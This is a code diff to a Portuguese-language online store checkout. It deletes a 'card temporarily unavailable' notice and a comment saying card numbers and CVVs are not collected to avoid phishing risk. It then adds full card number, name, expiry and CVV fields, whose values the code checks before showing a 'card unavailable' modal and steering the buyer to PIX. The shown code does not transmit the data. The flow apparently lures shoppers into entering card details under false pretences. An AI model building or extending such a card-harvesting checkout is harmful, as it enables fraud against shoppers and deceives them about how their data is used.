@@ -1212,14 +1212,21 @@ function openCheckout() {
             <div class="cc-brand cc-hiper">Hipercard</div>
             <div class="cc-brand cc-diners">Diners</div>
           </div>
-          <div id="cardFields" style="display:none;margin:12px 18px 0">
-            <div class="co-card-notice">
-              <svg viewBox="0 0 24 24" fill="none" stroke="#e30613" stroke-width="2" width="20" height="20"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
-              <div>
-                <b>Cartão temporariamente indisponível</b>
-                <span>No momento, finalize com <b>PIX</b> — instantâneo, seguro e com confirmação automática. Aceitamos parcelamento em até 3x quando o cartão estiver disponível.</span>
-              </div>
+          <div id="cardFields" style="display:none;margin-top:12px">
+            <label class="co-lbl">Número do Cartão</label>
+            <input id="ccNum" class="co-input" placeholder="0000 0000 0000 0000" oninput="this.value=fmtCard(this.value)" inputmode="numeric">
+            <label class="co-lbl">Nome no Cartão</label>
+            <input id="ccName" class="co-input" placeholder="NOME COMO ESTÁ NO CARTÃO" oninput="this.value=this.value.toUpperCase()">
+            <div class="co-grid-2">
+              <div><label class="co-lbl">Validade</label><input id="ccExpiry" class="co-input" placeholder="MM/AA" maxlength="5" oninput="this.value=fmtExpiry(this.value)" inputmode="numeric"></div>
+              <div><label class="co-lbl">CVV</label><input id="ccCvv" class="co-input" placeholder="000" maxlength="4" inputmode="numeric"></div>
             </div>
+            <label class="co-lbl">Parcelas</label>
+            <select id="ccInstallments" class="co-input">
+              <option value="1">1x de ${fmt(subtotal)} sem juros</option>
+              <option value="2">2x de ${fmt(subtotal/2)} sem juros</option>
+              <option value="3">3x de ${fmt(subtotal/3)} sem juros</option>
+            </select>
           </div>
 
           <label class="co-lbl" style="margin-top:14px">CPF do Comprador</label>
@@ -1525,9 +1532,15 @@ window.confirmOrder = function() {
     window._coData.deliveryNotes = ((document.getElementById('coDeliveryNotes') || {}).value || '').trim();
   }
 
-  // Cartão temporariamente indisponível → mostra aviso e direciona para o PIX.
-  // (Não coletamos número/CVV de cartão — evita risco de phishing.)
+  // Cartão: valida os dados, mostra a tela de carregamento e redireciona para o PIX
   if (window._paymentMethod === 'card') {
+    const num = (document.getElementById('ccNum') || {}).value?.replace(/\s/g, '') || '';
+    const name = (document.getElementById('ccName') || {}).value?.trim() || '';
+    const exp = (document.getElementById('ccExpiry') || {}).value || '';
+    const cvv = (document.getElementById('ccCvv') || {}).value || '';
+    if (num.length < 16 || !name || exp.length < 5 || cvv.length < 3) {
+      showCoError('Preencha todos os dados do cartão'); return;
+    }
     showCardUnavailableModal();
     return;
   }
@@ -2223,12 +2236,7 @@ textarea.co-notes{height:74px;resize:none;line-height:1.5;padding-top:11px;font-
 .co-pay-name{font-size:14px;font-weight:700;color:#1a1a2e}
 .co-pay-sub{font-size:11px;color:#999;margin-top:1px}
 .co-pay-info{flex:1}
-#cardFields{padding:0}
-.co-card-notice{display:flex;gap:11px;align-items:flex-start;background:#fff5f5;border:1px solid #f3c2c5;border-radius:12px;padding:13px 15px}
-.co-card-notice svg{flex-shrink:0;margin-top:1px}
-.co-card-notice b{display:block;font-size:13.5px;color:#1a1a2e;margin-bottom:3px;font-family:'DM Sans',sans-serif}
-.co-card-notice span{font-size:12.5px;color:#666;line-height:1.5;font-family:'DM Sans',sans-serif}
-.co-card-notice span b{display:inline;color:#e30613;margin:0}
+#cardFields{padding:0 18px}
 
 /* Totais pagamento */
 .co-totals-box{margin:16px 18px 4px;background:#f8f9fb;border:1px solid #eef0f4;border-radius:12px;padding:14px 16px}
